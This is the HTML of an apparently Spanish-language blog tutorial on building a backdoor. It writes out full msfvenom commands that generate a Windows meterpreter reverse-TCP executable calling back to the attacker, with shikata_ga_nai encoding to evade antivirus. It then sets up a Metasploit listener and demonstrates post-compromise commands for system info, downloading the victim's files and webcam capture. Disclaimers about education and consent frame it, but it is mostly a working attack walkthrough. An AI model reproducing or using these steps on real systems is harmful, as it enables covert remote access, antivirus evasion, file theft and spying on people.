@@ -1,0 +1,571 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="es" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Cómo crear un backdoor y su funcionamiento - r4kso      Blog de ciberseguridad      </title>
+<meta name="description" content="En este post te enseñaré cómo crear un backdoor, técnicas básicas para esconderlo y el funcionamiento desde el punto de vista del atacante y de la víctima. Podrás ver cómo se accede a su webcam, archivos…">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="r4kso | Blog de ciberseguridad">
+<meta property="og:title" content="Cómo crear un backdoor y su funcionamiento">
+<meta property="og:url" content="http://localhost:4000/crear-backdoors/">
+
+
+  <meta property="og:description" content="En este post te enseñaré cómo crear un backdoor, técnicas básicas para esconderlo y el funcionamiento desde el punto de vista del atacante y de la víctima. Podrás ver cómo se accede a su webcam, archivos…">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/crear-backdoor-como-funciona/portada.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-05-30T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/crear-backdoors/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "r4kso",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+  <meta name="google-site-verification" content="i-4J_ebaBRiAqToKNWnZp_rUjs2sm7fmwCbqz8kd7Sg" />
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="r4kso | Blog de ciberseguridad Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Inicio</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Sobre mí</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Cómo crear un backdoor y su funcionamiento</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/profilepic.jpg" alt="r4kso" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">r4kso</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        IT degree student / Interested in cybersecurity / Pentester wannabe
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/r4kso_cs" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/fran-hernández-rizo-624b891aa" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+        <li>
+          <a href="https://instagram.com/fran.r4kso" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/r4kso" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Cómo crear un backdoor y su funcionamiento">
+    <meta itemprop="description" content="En este post te enseñaré cómo crear un backdoor, técnicas básicas para esconderlo y el funcionamiento desde el punto de vista del atacante y de la víctima. Podrás ver cómo se accede a su webcam, archivos…">
+    <meta itemprop="datePublished" content="May 30, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Cómo crear un backdoor y su funcionamiento
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-05-30T00:00:00+01:00">May 30, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/portada.jpg" width="80%" />
+</p>
+
+<p class="notice--danger"><strong>Aviso:</strong> Este post se ha realizado únicamente con fines educativos. No me hago responsable de las acciones que puedan realizar terceras personas, fruto del conocimiento transmitido.</p>
+
+<blockquote>
+  <p><strong>Backdoor</strong>: Un backdoor (puerta trasera), es una secuencia dentro del código de programación de algún archivo o programa que permite otorgar el control del dispositivo utilizado al atacante. Cuando esta puerta trasera es escondida sobre un archivo o programa aparentemente legítimo, decimos que se trata de un troyano.</p>
+</blockquote>
+
+<p>Actualmente crear un backdoor es bastante sencillo, pues existen diferentes herramientas que nos facilitan la tarea. La complejidad real viene a al momento de esconderlo y evitar que la víctima se de cuenta.</p>
+
+<p>Veremos cómo crear ese backdoor mediante el uso de “msfvenom”, cómo evadir algunos antivirus y qué se puede hacer una vez se haya comprometido el sistema de la víctima (podremos ver su webcam en tiempo real, sus archivos…).</p>
+
+<p>NOTA: Todas las pruebas se han realizado en entornos controlados.</p>
+
+<h2 id="creación-del-backdoor">Creación del backdoor</h2>
+<p>Para empezar con la creación del backdoor, abriremos una consola linux y buscaremos las diferentes opciones de <strong>msfvenom</strong> para ver qué nos permite hacer mediante el comando <code class="language-plaintext highlighter-rouge">msfvenom -h</code></p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/msfvenom.png" width="100%" />
+</p>
+
+<p>Como vemos, nos ofrece diferentes parámetros y opciones. A nosotros nos interesan los siguientes:</p>
+<ul>
+  <li>“-p”: Mediante este parámetro seleccionaremos la carga útil (el código malicioso) -&gt; <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code></li>
+  <li>“lhost”: Indicaremos nuestra IP, donde el programa establecerá conexión y así poder recibir y enviar información -&gt; <code class="language-plaintext highlighter-rouge">&lt;tu IP&gt;</code></li>
+  <li>“lport”: Indicaremos el puerto que queramos utilizar al momento de entablar la conexión -&gt; <code class="language-plaintext highlighter-rouge">&lt;el puerto que tú quieras&gt;</code></li>
+  <li>“-f”: Mediante este parámetro seleccionaremos el formato del programa malicioso -&gt; <code class="language-plaintext highlighter-rouge">exe</code></li>
+  <li>“-o”: Mediante este parámetro indicaremos la ruta de salida del programa creado -&gt; <code class="language-plaintext highlighter-rouge">&lt;la ruta que tú decidas&gt;</code></li>
+</ul>
+
+<p>El comando final quedaría de la siguiente forma:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.1.<span class="k">***</span> <span class="nv">lport</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="nt">-o</span> /home/r4kso/Desktop/backdoor.exe
+</code></pre></div></div>
+
+<p>Como vemos, se nos ha creado el programa malicioso :</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/creacion-programa.png" width="100%" />
+</p>
+
+<p>Ahora, solo bastaría con hacer que el objetivo inicie el programa, pero nos encontramos con un problema… Y es que es muy sencillo de detectar por los antivirus, como demuestra la siguiente prueba:</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/prueba-virustotal.png" width="50%" />
+</p>
+
+<p>Casi todos los antivirus lo han detectado así que… ¿Qué podemos hacer? Pues bien, a parte de utilizar otros formatos y sistemas como las <strong>macros de Suite de Office</strong> para esconder nuestras backdoors, podemos usar algo llamado <strong>encoders</strong>. Tal y como su nombre indica, los <em>enconders</em> codifican el programa, haciéndolo más difícil de leer para los antivirus. No siempre funciona y es por ello que se requieren diferentes métodos. A continuación veremos cómo funciona un encoder.</p>
+
+<h2 id="usando-encoders">Usando encoders</h2>
+<p>msfvenom ofrece la posibilidad de usar un encoder en el momento de crear el programa malicioso. Existen diferentes encoders, uno de los más comúnes es “shikata_ga_nai”. Para utilizarlo, debemos volver a crear el programa, esta vez con dos parámetros extras:</p>
+<ul>
+  <li>“-e”: Indica el encoder a utilizar -&gt; <code class="language-plaintext highlighter-rouge">x86/shikata_ga_nai</code></li>
+  <li>“-i”: El numero de iteraciones -&gt; <code class="language-plaintext highlighter-rouge">5</code></li>
+</ul>
+
+<p>El número de iteraciones a utilizar indica la cantidad de veces que se codificará el programa, haciendo el programa cada vez menos legible con cada iteración. Se recomienda no iterar más de 5 veces, pues el antivirus lo puede detectar directamente como <em>malware</em>.</p>
+
+<p>Bien, pues el comando final quedaría de la siguiente forma:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.1.<span class="k">***</span> <span class="nv">lport</span><span class="o">=</span>4444 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-i</span> 5 <span class="nt">-f</span> exe <span class="nt">-o</span> /home/r4kso/Desktop/backdoor.exe
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/creacion-programa-codificado.png" width="100%" />
+</p>
+
+<p>Como se puede ver en consola, el programa se ha creado correctamente y esta vez codificado para tratar de <em>bypassear</em> al antivirus.</p>
+
+<blockquote>
+  <p>Nota: Esto NO será suficiente para engañar al antivirus, se necesitan otros métodos para conseguirlo.</p>
+</blockquote>
+
+<p>Ahora iniciaremos la <strong>escucha</strong> en el puerto que hayamos escogido para nuestro programa malicioso, sirviéndonos de Metasploit. Para ello, lo iniciaremos mediante el comando <code class="language-plaintext highlighter-rouge">msfconsole</code>, usaremos la utilidad <code class="language-plaintext highlighter-rouge">multi/handler</code>. Una vez dentro de esta utilidad indicaremos qué tipo de payload hemos utilizado mediante el comando <code class="language-plaintext highlighter-rouge">payload windows/meterpreter/reverse_tcp</code>. Después, indicaremos el host (<code class="language-plaintext highlighter-rouge">LHOST</code>) y el puerto (<code class="language-plaintext highlighter-rouge">LPORT</code>).</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/msfconsole.png" width="50%" />
+</p>
+
+<p>Ahora que estamos a la escucha, una vez se inicie el programa en el equipo correspondiente obtendremos acceso al sistema.</p>
+
+<h2 id="comprometiendo-el-sistema">Comprometiendo el sistema</h2>
+<p>Solo queda instalar el programa malicioso en el equipo correspondiente. Desactivo los antivirus e inicio el programa.</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/backdoor-en-pc.png" width="70%" />
+</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/proteccion-windows.png" width="70%" />
+</p>
+
+<p>Como vemos, nos ha saltado una alerta de windows diciendo que el programa podría ser peligroso, <strong>lo ejecutamos de todas formas</strong> ¡y listo! Sistema comprometido. Desde el punto de vista de la víctima, no ha pasado absolutamente nada… Pero desde el punto de vista del atacante, hemos conseguido el acceso completo.</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/meterpreter-iniciado.png" width="100%" />
+</p>
+
+<p>Vamos a trastear un poco y ver qué podemos hacer…</p>
+
+<h2 id="fase-de-acción">Fase de acción</h2>
+<p>Para obtener información sobre el sistema en el que estamos, usamos el comando <code class="language-plaintext highlighter-rouge">sysinfo</code></p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/sysinfo.png" width="60%" />
+</p>
+
+<p>Bien, como tenemos el control completo nos podemos mover entre los archivos. Para descargar un archivo, utilizaremos el comando <code class="language-plaintext highlighter-rouge">download &lt;archivo&gt;</code>. Descargaremos esta foto que se encuentra en la carpeta de Descargas</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/download.png" width="70%" />
+</p>
+
+<p>Hemos conseguido descargar en nuestro equipo la foto, qué bonitos :D</p>
+
+<p align="center">
+<img src="/assets/images/crear-backdoor-como-funciona/gatitos.png" width="80%" />
+</p>
+
+<p>También podremos acceder a la webcam, mediante el comando <code class="language-plaintext highlighter-rouge">webcam_snap -c 1</code>. Esto no lo podré demostrar dado que no tengo webcam, pero pruébalo tú mismo.</p>
+
+<p>Como vemos, se puede hacer cualquier cosa… A partir de aquí toca buscarse la vida: convertir la sesión meterpreter en una Shell, migración de procesos… Sé creativo ;)</p>
+
+<p class="notice--danger">Aviso: Realizar siempre en entornos controlados y con el consentimiendo de la persona. El incumplimiento de esto puede llevar a acciones legales.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#backdoors" class="page__taxonomy-item" rel="tag">Backdoors</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#msfvenom" class="page__taxonomy-item" rel="tag">msfvenom</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#redes" class="page__taxonomy-item" rel="tag">Redes</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#tutoriales" class="page__taxonomy-item" rel="tag">Tutoriales</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#tutoriales" class="page__taxonomy-item" rel="tag">Tutoriales</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-05-30T00:00:00+01:00">May 30, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/que-es-un-socket-y-como-funciona/" class="pagination--pager" title="Qué es un socket y cómo funciona
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 r4kso</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
